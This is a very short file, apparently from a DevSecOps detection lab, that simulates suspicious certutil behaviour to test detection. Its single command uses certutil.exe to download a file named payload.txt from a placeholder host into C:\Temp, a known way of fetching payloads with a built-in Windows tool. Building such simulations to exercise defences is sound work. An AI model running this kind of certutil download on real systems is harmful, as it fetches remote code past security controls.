# DevSecOps Detection Lab
# Controlled simulation: certutil suspicious download behavior

certutil.exe -urlcache -split -f https://example.invalid/payload.txt C:\Temp\payload.txt
